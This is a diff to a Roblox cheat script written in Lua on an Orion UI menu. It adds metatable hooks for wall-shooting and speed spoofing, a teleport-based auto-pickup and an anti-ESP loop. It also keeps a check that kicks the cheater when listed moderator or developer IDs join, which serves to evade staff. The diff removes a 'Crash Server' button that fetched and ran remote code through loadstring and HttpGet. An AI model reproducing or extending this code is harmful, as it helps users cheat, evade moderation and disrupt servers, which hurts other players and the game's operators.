@@ -1,3 +1,10 @@
+for i, v in pairs(game.Players:GetChildren()) do
+	local ui = v.UserId
+	if ui == 1711686684 or ui == 30926698 or ui == 121247273 or ui == 430335792 or ui == 63590514 or ui == 9486667 or ui == 71305063 or ui == 291643630 or ui == 9624991 or ui == 90807940 or ui == 85159204 or ui == 1330516136 or ui == 1095419 or ui == 17030889 or ui == 24681378 or ui == 25828512 or ui == 43795134 or ui == 20408132 or ui == 49405424 or ui == 23915919 or ui == 2205401822 or ui == 52187831 or ui == 33184799 or ui == 62505243 or ui == 6512464 or ui == 21464308 or ui == 47939131 or ui == 2820112 or ui == 23239501 or ui == 9960695 or ui == 7928245 then
+		game.Players.LocalPlayer:Kick("The Moderator/Developer is in the server.")
+	end
+end
+
 Luazifier = {} 
 setmetatable(Luazifier, {__metatable = "Lol"})
 
@@ -877,6 +884,25 @@ setreadonly(MT, true)
 })
 
 CombatTab:AddToggle({
+	Name = "Semi-Wallbang",
+	Default = false,
+	Callback = function(Value)
+		if Value then
+			local MT = getrawmetatable(game)
+			local OldIDX = MT.__index
+			setreadonly(MT, false)
+			MT.__index = newcclosure(function(self, K)
+				if K == "Clips" then
+					return workspace.Map
+				end
+				return OldIDX(self, K)
+			end)
+			setreadonly(MT, true)
+		end
+	end
+})
+
+CombatTab:AddToggle({
 	Name = "Instant Respawn",
 	Default = false,
 	Callback = function(Value)
@@ -909,22 +935,6 @@ CombatTab:AddToggle({
 			end
 		end
 	end    
-})
-
-CombatTab:AddButton({
-	Name = "Semi-Wallbang",
-	Callback = function()
-		local MT = getrawmetatable(game)
-		local OldIDX = MT.__index
-		setreadonly(MT, false)
-		MT.__index = newcclosure(function(self, K)
-		    if K == "Clips" then
-				return workspace.Map
-		    end
-		    return OldIDX(self, K)
-		end)
-		setreadonly(MT, true)
-  	end    
 })
 
 CombatTab:AddDropdown({
@@ -1043,16 +1053,24 @@ LPTab:AddButton({
   	end    
 })
 
-LPTab:AddButton({
-	Name = "Fast",
-	Callback = function()
-		local hmd = game.Players.LocalPlayer.Character.Humanoid
-
-		wait(1)
-		hmd:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
-			hmd.WalkSpeed = 90
+LPTab:AddToggle({
+	Name = "WalkSpeed",
+	Default = false,
+	Callback = function(Value)
+		local gmt = getrawmetatable(game)
+		setreadonly(gmt, false)
+		local oldindex = gmt.__index
+		gmt.__index = newcclosure(function(self,b)
+			if b == "WalkSpeed" then
+				if Value then
+					return 90
+				else
+					return 22.84
+				end
+			end
+			return oldindex(self,b)
 		end)
-  	end    
+	end    
 })
 
 LPTab:AddToggle({
@@ -1220,11 +1238,14 @@ MiscTab:AddToggle({
 	Callback = function(Value)
 		_G.APUB = Value
         while _G.APUB do
-            wait(0.01)
+            wait(0.034)
             if game.Workspace:FindFirstChild("Debris")then
                 if game.Workspace.Debris:FindFirstChild("Oddball")then
+					local old_cf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=
                     game.Workspace.Debris.Oddball.Ballnew.CFrame
+					wait()
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = old_cf
                 end
             end
         end
@@ -1254,7 +1275,7 @@ MiscTab:AddToggle({
 	Callback = function(Value)
 		_G.AntiESP = Value
         while _G.AntiESP do
-            wait(0.01)
+            wait(0.1)
             if game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Donkey")then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.Donkey:Destroy()
             end
@@ -1276,18 +1297,6 @@ MiscTab:AddButton({
 	Callback = function()
 		game.Players.LocalPlayer.Character.Spawned:Destroy()
 		game.Players.LocalPlayer.Character.Humanoid.Jump = true
-  	end
-})
-
-MiscTab:AddButton({
-	Name = "Crash Server",
-	Callback = function()
-		local credit='guardscripts'
-		print("script not made by me so, credits: guardscripts")
-		local url=('https://raw.githubusercontent.com/%s/myscripts/main/scriptinit.lua'):format(credit)
-		init=loadstring(game:HttpGet(url,true))
-		getgenv().xscriptId='XzIwNDU='
-		init()
   	end
 })
 
@@ -1317,14 +1326,5 @@ MiscTab:AddDropdown({
 		end
 	end    
 })
-
-while wait(2) do
-    for i, v in pairs(game.Players:GetChildren()) do
-        local ui = v.UserId
-        if ui == 1711686684 or ui == 30926698 or ui == 121247273 or ui == 430335792 or ui == 63590514 or ui == 9486667 or ui == 71305063 or ui == 291643630 or ui == 9624991 or ui == 90807940 or ui == 85159204 or ui == 1330516136 or ui == 1095419 or ui == 17030889 or ui == 24681378 or ui == 25828512 or ui == 43795134 or ui == 20408132 or ui == 49405424 or ui == 23915919 or ui == 2205401822 or ui == 52187831 or ui == 33184799 or ui == 62505243 or ui == 6512464 or ui == 21464308 or ui == 47939131 or ui == 2820112 or ui == 23239501 or ui == 9960695 or ui == 7928245 then
-            game.Players.LocalPlayer:Kick("The Moderator/Developer is in the server.")
-        end
-    end
-end
 
 OrionLib:Init()
